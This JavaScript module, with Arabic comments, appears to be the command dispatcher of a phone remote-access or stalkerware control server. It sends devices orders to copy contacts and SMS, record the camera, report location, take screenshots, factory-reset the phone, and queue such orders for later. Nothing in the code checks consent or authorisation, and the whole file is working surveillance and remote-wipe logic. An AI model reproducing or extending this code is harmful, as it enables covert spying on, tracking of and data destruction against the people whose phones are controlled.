class CommandHandler {
    constructor(deviceManager) {
        this.deviceManager = deviceManager;
        this.commandQueue = new Map();
    }

    // معالجة الأمر الوارد
    async handleCommand(deviceId, command) {
        try {
            console.log(`معالجة أمر للجهاز ${deviceId}:`, command);

            switch (command.action) {
                case 'backup_contacts':
                    return await this.handleBackupContacts(deviceId);
                
                case 'backup_sms':
                    return await this.handleBackupSMS(deviceId);
                
                case 'record_camera':
                    return await this.handleRecordCamera(deviceId, command.duration || 30);
                
                case 'factory_reset':
                    return await this.handleFactoryReset(deviceId);
                
                case 'get_location':
                    return await this.handleGetLocation(deviceId);
                
                case 'take_screenshot':
                    return await this.handleTakeScreenshot(deviceId);
                
                default:
                    throw new Error(`الأمر غير معروف: ${command.action}`);
            }
        } catch (error) {
            console.error(`خطأ في معالجة الأمر للجهاز ${deviceId}:`, error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    // معالجة نسخ جهات الاتصال
    async handleBackupContacts(deviceId) {
        const command = {
            action: 'backup_contacts',
            timestamp: Date.now()
        };

        this.deviceManager.sendCommand(deviceId, command);
        
        return {
            success: true,
            message: 'تم إرسال أمر نسخ جهات الاتصال',
            command: command
        };
    }

    // معالجة نسخ الرسائل النصية
    async handleBackupSMS(deviceId) {
        const command = {
            action: 'backup_sms',
            timestamp: Date.now()
        };

        this.deviceManager.sendCommand(deviceId, command);
        
        return {
            success: true,
            message: 'تم إرسال أمر نسخ الرسائل النصية',
            command: command
        };
    }

    // معالجة تسجيل الكاميرا
    async handleRecordCamera(deviceId, duration) {
        const command = {
            action: 'record_camera',
            duration: duration,
            timestamp: Date.now()
        };

        this.deviceManager.sendCommand(deviceId, command);
        
        return {
            success: true,
            message: `تم إرسال أمر تسجيل الكاميرا لمدة ${duration} ثانية`,
            command: command
        };
    }

    // معالجة إعادة ضبط المصنع
    async handleFactoryReset(deviceId) {
        const command = {
            action: 'factory_reset',
            timestamp: Date.now()
        };

        this.deviceManager.sendCommand(deviceId, command);
        
        return {
            success: true,
            message: 'تم إرسال أمر إعادة ضبط المصنع',
            command: command
        };
    }

    // معالجة الحصول على الموقع
    async handleGetLocation(deviceId) {
        const command = {
            action: 'get_location',
            timestamp: Date.now()
        };

        this.deviceManager.sendCommand(deviceId, command);
        
        return {
            success: true,
            message: 'تم إرسال أمر الحصول على الموقع',
            command: command
        };
    }

    // معالجة التقاط لقطة شاشة
    async handleTakeScreenshot(deviceId) {
        const command = {
            action: 'take_screenshot',
            timestamp: Date.now()
        };

        this.deviceManager.sendCommand(deviceId, command);
        
        return {
            success: true,
            message: 'تم إرسال أمر التقاط لقطة شاشة',
            command: command
        };
    }

    // إضافة أمر إلى قائمة الانتظار
    queueCommand(deviceId, command) {
        if (!this.commandQueue.has(deviceId)) {
            this.commandQueue.set(deviceId, []);
        }
        
        this.commandQueue.get(deviceId).push({
            ...command,
            queuedAt: Date.now()
        });
    }

    // معالجة قائمة انتظار الأوامر
    async processCommandQueue(deviceId) {
        if (!this.commandQueue.has(deviceId)) {
            return;
        }

        const queue = this.commandQueue.get(deviceId);
        const results = [];

        for (const command of queue) {
            try {
                const result = await this.handleCommand(deviceId, command);
                results.push(result);
            } catch (error) {
                results.push({
                    success: false,
                    error: error.message,
                    command: command
                });
            }
        }

        // مسح قائمة الانتظار
        this.commandQueue.delete(deviceId);
        
        return results;
    }
}

module.exports = CommandHandler;